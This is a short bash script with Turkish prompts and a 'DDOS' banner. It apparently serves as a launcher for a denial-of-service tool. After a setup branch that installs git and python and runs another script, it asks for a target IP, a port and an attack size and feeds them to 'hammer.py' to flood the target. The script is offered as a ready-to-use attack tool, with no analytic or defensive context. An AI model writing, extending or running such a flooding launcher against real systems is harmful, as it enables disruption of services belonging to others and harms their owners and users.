#!/bin/bash
clear

banner(){

echo -e "\e[31m
◘◘◘◘◘◘◘◘◘◘◘◘◘◘◘◘◘◘◘◘◘◘◘◘◘◘◘◘
 ____   ____   _____  _____ 
|    \ |    \ |     ||   __|\e[36m
|  |  ||  |  ||  |  ||__   |\e[39m
|____/ |____/ |_____||_____|

         YamanEfkar
◘◘◘◘◘◘◘◘◘◘◘◘◘◘◘◘◘◘◘◘◘◘◘◘◘◘◘◘
"
}

if [[ -e "YamanEfkar" ]]; then
	banner
	read -p $'\e[31m[\e[32m!\e[31m]\e[37mHedef IP : ' ip
	echo -e ""
	read -p $'\e[31m[\e[32m!\e[31m]\e[37mPort Numarası : ' port
	echo -e ""
	read -p $'\e[31m[\e[32m!\e[31m]\e[37mSaldırı Boyutu [Default 135] : ' mb
	echo -e ""
	cd Script && 
	python3 hammer.py -s $ip -p $port -t $mb 

else
mkdir YamanEfkar
apt update && apt upgrade -y 
pkg install git -y 
pkg install python python2 -y
echo -e "\e[31mKurulum Bitti"
sleep 1
bash tst.sh


fi
